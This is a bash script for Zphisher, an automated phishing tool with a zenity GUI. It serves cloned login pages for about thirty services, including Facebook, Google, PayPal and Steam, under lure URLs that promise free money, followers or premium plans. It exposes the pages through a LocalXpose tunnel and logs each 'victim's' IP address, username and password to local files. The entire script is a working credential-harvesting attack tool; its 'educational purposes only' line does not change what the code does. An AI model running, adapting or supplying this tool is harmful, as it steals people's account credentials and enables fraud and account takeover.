#!/bin/bash

##   Zphisher 	: 	Automated Phishing Tool (GUI Version)
##   Author 	: 	TAHMID RAYAT 
##   Version 	: 	2.3.5
##   Github 	: 	https://github.com/htr-tech/zphisher

__version__="2.3.5"

## DEFAULT HOST & PORT
HOST='localhost'
PORT='8080'

## ANSI colors (FG & BG)
RED="$(printf '\033[31m')"  GREEN="$(printf '\033[32m')"  ORANGE="$(printf '\033[33m')"  BLUE="$(printf '\033[34m')"
MAGENTA="$(printf '\033[35m')"  CYAN="$(printf '\033[36m')"  WHITE="$(printf '\033[37m')" BLACK="$(printf '\033[30m')"
REDBG="$(printf '\033[41m')"  GREENBG="$(printf '\033[42m')"  ORANGEBG="$(printf '\033[43m')"  BLUEBG="$(printf '\033[44m')"
MAGENTABG="$(printf '\033[45m')"  CYANBG="$(printf '\033[46m')"  WHITEBG="$(printf '\033[47m')" BLACKBG="$(printf '\033[40m')"
RESETBG="$(printf '\e[0m\n')"

## Directories
BASE_DIR=$(realpath "$(dirname "$BASH_SOURCE")")

[ ! -d ".server" ] && mkdir -p ".server"
[ ! -d "auth" ] && mkdir -p "auth"
[ -d ".server/www" ] && rm -rf ".server/www"
mkdir -p ".server/www"

## Remove logfile
[ -e ".server/.loclx" ] && rm -rf ".server/.loclx"
[ -e ".server/.cld.log" ] && rm -rf ".server/.cld.log"

## Script termination
exit_on_signal_SIGINT() {
    { printf "\n\n%s\n\n" "${RED}[${WHITE}!${RED}]${RED} Program Interrupted." 2>&1; reset_color; }
    exit 0
}

exit_on_signal_SIGTERM() {
    { printf "\n\n%s\n\n" "${RED}[${WHITE}!${RED}]${RED} Program Terminated." 2>&1; reset_color; }
    exit 0
}

trap exit_on_signal_SIGINT SIGINT
trap exit_on_signal_SIGTERM SIGTERM

## Reset terminal colors
reset_color() {
    tput sgr0   # reset attributes
    tput op     # reset color
    return
}

## Check for a newer release
check_update() {
    echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Checking for update : "
    relase_url='https://api.github.com/repos/htr-tech/zphisher/releases/latest'
    new_version=$(curl -s "${relase_url}" | grep '"tag_name":' | awk -F\" '{print $4}')
    tarball_url="https://github.com/htr-tech/zphisher/archive/refs/tags/${new_version}.tar.gz"

    if [[ $new_version != $__version__ ]]; then
        echo -ne "${ORANGE}update found\n"${WHITE}
        sleep 2
        echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${ORANGE} Downloading Update..."
        pushd "$HOME" > /dev/null 2>&1
        curl --silent --insecure --fail --retry-connrefused \
        --retry 3 --retry-delay 2 --location --output ".zphisher.tar.gz" "${tarball_url}"

        if [[ -e ".zphisher.tar.gz" ]]; then
            tar -xf .zphisher.tar.gz -C "$BASE_DIR" --strip-components 1 > /dev/null 2>&1
            [ $? -ne 0 ] && { echo -e "\n\n${RED}[${WHITE}!${RED}]${RED} Error occured while extracting."; reset_color; exit 1; }
            rm -f .zphisher.tar.gz
            popd > /dev/null 2>&1
            { sleep 3; clear; }
            echo -ne "\n${GREEN}[${WHITE}+${GREEN}] Successfully updated! Run zphisher again\n\n"${WHITE}
            { reset_color ; exit 1; }
        else
            echo -e "\n${RED}[${WHITE}!${RED}]${RED} Error occured while downloading."
            { reset_color; exit 1; }
        fi
    else
        echo -ne "${GREEN}up to date\n${WHITE}" ; sleep .5
    fi
}

## Check Internet Status
check_status() {
    echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Internet Status : "
    timeout 3s curl -fIs "https://api.github.com" > /dev/null
    [ $? -eq 0 ] && echo -e "${GREEN}Online${WHITE}" && check_update || echo -e "${RED}Offline${WHITE}"
}

## Banner
banner() {
    cat <<- EOF
		${ORANGE}
		${ORANGE} ______              _     _     _
		${ORANGE}|___  /             | |   (_)   | |
		${ORANGE}   / /      _ __    | |__  _ ___| |__   ___ _ __
		${ORANGE}  / /      | '_ \   | '_ \| / __| '_ \ / _ \ '__|
		${ORANGE} / /__     | |_) |  | | | | \__ \ | | |  __/ |
		${ORANGE}/_____| +  | .__/   |_| |_|_|___/_| |_|\___|_|
		${ORANGE}           | |
		${ORANGE}           |_|                ${RED}Version : ${__version__}

		${GREEN}[${WHITE}-${GREEN}]${CYAN} Tool Created by Kush)${WHITE}
	EOF
}

## Dependencies
dependencies() {
    echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Installing required packages..."

    if [[ -d "/data/data/com.termux/files/home" ]]; then
        if [[ ! $(command -v proot) ]]; then
            echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Installing package : ${ORANGE}proot${CYAN}"${WHITE}
            pkg install proot resolv-conf -y
        fi
        if [[ ! $(command -v tput) ]]; then
            echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Installing package : ${ORANGE}ncurses-utils${CYAN}"${WHITE}
            pkg install ncurses-utils -y
        fi
    fi

    if [[ $(command -v php) && $(command -v curl) && $(command -v unzip) ]]; then
        echo -e "\n${GREEN}[${WHITE}+${GREEN}]${GREEN} Packages already installed."
    else
        pkgs=(php curl unzip)
        for pkg in "${pkgs[@]}"; do
            type -p "$pkg" &>/dev/null || {
                echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Installing package : ${ORANGE}$pkg${CYAN}"${WHITE}
                if [[ $(command -v pkg) ]]; then
                    pkg install "$pkg" -y
                elif [[ $(command -v apt) ]]; then
                    sudo apt install "$pkg" -y
                elif [[ $(command -v apt-get) ]]; then
                    sudo apt-get install "$pkg" -y
                elif [[ $(command -v pacman) ]]; then
                    sudo pacman -S "$pkg" --noconfirm
                elif [[ $(command -v dnf) ]]; then
                    sudo dnf -y install "$pkg"
                elif [[ $(command -v yum) ]]; then
                    sudo yum -y install "$pkg"
                else
                    echo -e "\n${RED}[${WHITE}!${RED}]${RED} Unsupported package manager, Install packages manually."
                    { reset_color; exit 1; }
                fi
            }
        done
    fi
}

# Download Binaries
download() {
    url="$1"
    output="$2"
    file=`basename $url`
    if [[ -e "$file" || -e "$output" ]]; then
        rm -rf "$file" "$output"
    fi
    curl --silent --insecure --fail --retry-connrefused \
        --retry 3 --retry-delay 2 --location --output "${file}" "${url}"

    if [[ -e "$file" ]]; then
        if [[ ${file#*.} == "zip" ]]; then
            unzip -qq $file > /dev/null 2>&1
            mv -f $output .server/$output > /dev/null 2>&1
        elif [[ ${file#*.} == "tgz" ]]; then
            tar -zxf $file > /dev/null 2>&1
            mv -f $output .server/$output > /dev/null 2>&1
        else
            mv -f $file .server/$output > /dev/null 2>&1
        fi
        chmod +x .server/$output > /dev/null 2>&1
        rm -rf "$file"
    else
        echo -e "\n${RED}[${WHITE}!${RED}]${RED} Error occured while downloading ${output}."
        { reset_color; exit 1; }
    fi
}

## Install LocalXpose
install_localxpose() {
    if [[ -e ".server/loclx" ]]; then
        echo -e "\n${GREEN}[${WHITE}+${GREEN}]${GREEN} LocalXpose already installed."
    else
        echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Installing LocalXpose..."${WHITE}
        arch=`uname -m`
        if [[ ("$arch" == *'arm'*) || ("$arch" == *'Android'*) ]]; then
            download 'https://api.localxpose.io/api/v2/downloads/loclx-linux-arm.zip' 'loclx'
        elif [[ "$arch" == *'aarch64'* ]]; then
            download 'https://api.localxpose.io/api/v2/downloads/loclx-linux-arm64.zip' 'loclx'
        elif [[ "$arch" == *'x86_64'* ]]; then
            download 'https://api.localxpose.io/api/v2/downloads/loclx-linux-amd64.zip' 'loclx'
        else
            download 'https://api.localxpose.io/api/v2/downloads/loclx-linux-386.zip' 'loclx'
        fi
    fi
}

## Exit message
msg_exit() {
    zenity --info --title="Exit" --text="Thank you for using this tool. Have a good day." --width=300
    exit 0
}

## About
about() {
    zenity --info --title="About" --text="Author: TAHMID RAYAT\nGithub: https://github.com/htr-tech\nVersion: ${__version__}\n\nWarning: This tool is for educational purposes only!" --width=300
}

## Choose custom port
cusport() {
    PORT=$(zenity --entry --title="Custom Port" --text="Enter custom port (1024-9999):" --entry-text="8080")
    if ! [[ $PORT =~ ^[0-9]+$ ]] || [ $PORT -lt 1024 ] || [ $PORT -gt 9999 ]; then
        zenity --error --title="Error" --text="Invalid port! Using default 8080"
        PORT=8080
    fi
}

## Setup website and start php server
setup_site() {
    echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} Setting up server..."${WHITE}
    cp -rf .sites/"$website"/* .server/www
    cp -f .sites/ip.php .server/www/
    echo -ne "\n${RED}[${WHITE}-${RED}]${BLUE} Starting PHP server..."${WHITE}
    cd .server/www && php -S "$HOST":"$PORT" > /dev/null 2>&1 &
}

## Get IP address
capture_ip() {
    IP=$(awk -F'IP: ' '{print $2}' .server/www/ip.txt | xargs)
    IFS=$'\n'
    echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Victim's IP : ${BLUE}$IP"
    echo -ne "\n${RED}[${WHITE}-${RED}]${BLUE} Saved in : ${ORANGE}auth/ip.txt"
    cat .server/www/ip.txt >> auth/ip.txt
}

## Get credentials
capture_creds() {
    ACCOUNT=$(grep -o 'Username:.*' .server/www/usernames.txt | awk '{print $2}')
    PASSWORD=$(grep -o 'Pass:.*' .server/www/usernames.txt | awk -F ":." '{print $NF}')
    IFS=$'\n'
    echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Account : ${BLUE}$ACCOUNT"
    echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Password : ${BLUE}$PASSWORD"
    echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} Saved in : ${ORANGE}auth/usernames.dat"
    cat .server/www/usernames.txt >> auth/usernames.dat
    echo -ne "\n${RED}[${WHITE}-${RED}]${ORANGE} Waiting for Next Login Info, ${BLUE}Ctrl + C ${ORANGE}to exit. "
}

## Print data
capture_data() {
    zenity --info --title="Information" --text="Waiting for login information. Check terminal for details." --width=300
    while true; do
        if [[ -e ".server/www/ip.txt" ]]; then
            echo -e "\n\n${RED}[${WHITE}-${RED}]${GREEN} Victim IP Found !"
            capture_ip
            rm -rf .server/www/ip.txt
        fi
        sleep 0.75
        if [[ -e ".server/www/usernames.txt" ]]; then
            echo -e "\n\n${RED}[${WHITE}-${RED}]${GREEN} Login info Found !!"
            capture_creds
            rm -rf .server/www/usernames.txt
        fi
        sleep 0.75
    done
}

## Start LocalXpose
start_loclx() {
    cusport
    echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Initializing... ${GREEN}( ${CYAN}http://$HOST:$PORT ${GREEN})"
    { sleep 1; setup_site; }
    echo -e "\n\n${RED}[${WHITE}-${RED}]${GREEN} Launching LocalXpose..."
    if [[ `command -v termux-chroot` ]]; then
        sleep 1 && termux-chroot ./.server/loclx tunnel --raw-mode http --https-redirect -t "$HOST":"$PORT" > .server/.loclx 2>&1 &
    else
        sleep 1 && ./.server/loclx tunnel --raw-mode http --https-redirect -t "$HOST":"$PORT" > .server/.loclx 2>&1 &
    fi
    sleep 12
    loclx_url=$(cat .server/.loclx | grep -o '[0-9a-zA-Z.]*.loclx.io')
    zenity --info --title="LocalXpose" --text="URL: https://$loclx_url" --width=300
    capture_data
}

## Start localhost
start_localhost() {
    cusport
    echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Initializing... ${GREEN}( ${CYAN}http://$HOST:$PORT ${GREEN})"
    setup_site
    zenity --info --title="Localhost" --text="Successfully hosted at: http://$HOST:$PORT" --width=300
    capture_data
}

## Tunnel selection
tunnel_menu() {
    CHOICE=$(zenity --list --title="Tunnel Service" --column="ID" --column="Service" \
        "1" "Localhost" \
        "2" "LocalXpose" \
        --height=200 --width=300)

    case $CHOICE in
        "1")
            start_localhost;;
        "2")
            start_loclx;;
        *)
            zenity --error --title="Error" --text="Invalid option";;
    esac
}

## Site selection menus
site_facebook() {
    CHOICE=$(zenity --list --title="Facebook" --column="ID" --column="Page" \
        "1" "Traditional Login Page" \
        "2" "Advanced Voting Poll Login Page" \
        "3" "Fake Security Login Page" \
        "4" "Facebook Messenger Login Page" \
        --height=200 --width=300)

    case $CHOICE in
        "1")
            website="facebook"
            mask='https://blue-verified-badge-for-facebook-free'
            tunnel_menu;;
        "2")
            website="fb_advanced"
            mask='https://vote-for-the-best-social-media'
            tunnel_menu;;
        "3")
            website="fb_security"
            mask='https://make-your-facebook-secured-and-free-from-hackers'
            tunnel_menu;;
        "4")
            website="fb_messenger"
            mask='https://get-messenger-premium-features-free'
            tunnel_menu;;
        *)
            zenity --error --title="Error" --text="Invalid option";;
    esac
}

site_instagram() {
    CHOICE=$(zenity --list --title="Instagram" --column="ID" --column="Page" \
        "1" "Traditional Login Page" \
        "2" "Auto Followers Login Page" \
        "3" "1000 Followers Login Page" \
        "4" "Blue Badge Verify Login Page" \
        --height=200 --width=300)

    case $CHOICE in
        "1")
            website="instagram"
            mask='https://get-unlimited-followers-for-instagram'
            tunnel_menu;;
        "2")
            website="ig_followers"
            mask='https://get-unlimited-followers-for-instagram'
            tunnel_menu;;
        "3")
            website="insta_followers"
            mask='https://get-1000-followers-for-instagram'
            tunnel_menu;;
        "4")
            website="ig_verify"
            mask='https://blue-badge-verify-for-instagram-free'
            tunnel_menu;;
        *)
            zenity --error --title="Error" --text="Invalid option";;
    esac
}

site_gmail() {
    CHOICE=$(zenity --list --title="Gmail/Google" --column="ID" --column="Page" \
        "1" "Gmail Old Login Page" \
        "2" "Gmail New Login Page" \
        "3" "Advanced Voting Poll" \
        --height=200 --width=300)

    case $CHOICE in
        "1")
            website="google"
            mask='https://get-unlimited-google-drive-free'
            tunnel_menu;;
        "2")
            website="google_new"
            mask='https://get-unlimited-google-drive-free'
            tunnel_menu;;
        "3")
            website="google_poll"
            mask='https://vote-for-the-best-social-media'
            tunnel_menu;;
        *)
            zenity --error --title="Error" --text="Invalid option";;
    esac
}

site_vk() {
    CHOICE=$(zenity --list --title="VK" --column="ID" --column="Page" \
        "1" "Traditional Login Page" \
        "2" "Advanced Voting Poll Login Page" \
        --height=200 --width=300)

    case $CHOICE in
        "1")
            website="vk"
            mask='https://vk-premium-real-method-2020'
            tunnel_menu;;
        "2")
            website="vk_poll"
            mask='https://vote-for-the-best-social-media'
            tunnel_menu;;
        *)
            zenity --error --title="Error" --text="Invalid option";;
    esac
}

## Main menu
main_menu() {
    while true; do
        CHOICE=$(zenity --list --title="Zphisher v${__version__}" --column="ID" --column="Attack" \
            "1" "Facebook" \
            "2" "Instagram" \
            "3" "Google" \
            "4" "Microsoft" \
            "5" "Netflix" \
            "6" "PayPal" \
            "7" "Steam" \
            "8" "Twitter" \
            "9" "Playstation" \
            "10" "TikTok" \
            "11" "Twitch" \
            "12" "Pinterest" \
            "13" "Snapchat" \
            "14" "LinkedIn" \
            "15" "eBay" \
            "16" "Quora" \
            "17" "ProtonMail" \
            "18" "Spotify" \
            "19" "Reddit" \
            "20" "Adobe" \
            "21" "DeviantArt" \
            "22" "Badoo" \
            "23" "Origin" \
            "24" "DropBox" \
            "25" "Yahoo" \
            "26" "WordPress" \
            "27" "Yandex" \
            "28" "StackOverflow" \
            "29" "VK" \
            "30" "XBOX" \
            "99" "About" \
            "00" "Exit" \
            --height=500 --width=400)

        case $CHOICE in
            "1") site_facebook;;
            "2") site_instagram;;
            "3") site_gmail;;
            "4")
                website="microsoft"
                mask='https://unlimited-onedrive-space-for-free'
                tunnel_menu;;
            "5")
                website="netflix"
                mask='https://upgrade-your-netflix-plan-free'
                tunnel_menu;;
            "6")
                website="paypal"
                mask='https://get-500-usd-free-to-your-acount'
                tunnel_menu;;
            "7")
                website="steam"
                mask='https://steam-500-usd-gift-card-free'
                tunnel_menu;;
            "8")
                website="twitter"
                mask='https://get-blue-badge-on-twitter-free'
                tunnel_menu;;
            "9")
                website="playstation"
                mask='https://playstation-500-usd-gift-card-free'
                tunnel_menu;;
            "10")
                website="tiktok"
                mask='https://tiktok-free-liker'
                tunnel_menu;;
            "11")
                website="twitch"
                mask='https://unlimited-twitch-tv-user-for-free'
                tunnel_menu;;
            "12")
                website="pinterest"
                mask='https://get-a-premium-plan-for-pinterest-free'
                tunnel_menu;;
            "13")
                website="snapchat"
                mask='https://view-locked-snapchat-accounts-secretly'
                tunnel_menu;;
            "14")
                website="linkedin"
                mask='https://get-a-premium-plan-for-linkedin-free'
                tunnel_menu;;
            "15")
                website="ebay"
                mask='https://get-500-usd-free-to-your-acount'
                tunnel_menu;;
            "16")
                website="quora"
                mask='https://quora-premium-for-free'
                tunnel_menu;;
            "17")
                website="protonmail"
                mask='https://protonmail-pro-basics-for-free'
                tunnel_menu;;
            "18")
                website="spotify"
                mask='https://convert-your-account-to-spotify-premium'
                tunnel_menu;;
            "19")
                website="reddit"
                mask='https://reddit-official-verified-member-badge'
                tunnel_menu;;
            "20")
                website="adobe"
                mask='https://get-adobe-lifetime-pro-membership-free'
                tunnel_menu;;
            "21")
                website="deviantart"
                mask='https://get-500-usd-free-to-your-acount'
                tunnel_menu;;
            "22")
                website="badoo"
                mask='https://get-500-usd-free-to-your-acount'
                tunnel_menu;;
            "23")
                website="origin"
                mask='https://get-500-usd-free-to-your-acount'
                tunnel_menu;;
            "24")
                website="dropbox"
                mask='https://get-1TB-cloud-storage-free'
                tunnel_menu;;
            "25")
                website="yahoo"
                mask='https://grab-mail-from-anyother-yahoo-account-free'
                tunnel_menu;;
            "26")
                website="wordpress"
                mask='https://unlimited-wordpress-traffic-free'
                tunnel_menu;;
            "27")
                website="yandex"
                mask='https://grab-mail-from-anyother-yandex-account-free'
                tunnel_menu;;
            "28")
                website="stackoverflow"
                mask='https://get-stackoverflow-lifetime-pro-membership-free'
                tunnel_menu;;
            "29") site_vk;;
            "30")
                website="xbox"
                mask='https://get-500-usd-free-to-your-acount'
                tunnel_menu;;
            "99") about;;
            "00") msg_exit;;
            *) zenity --error --title="Error" --text="Invalid option";;
        esac
    done
}

## Main
dependencies
check_status
install_localxpose
main_menu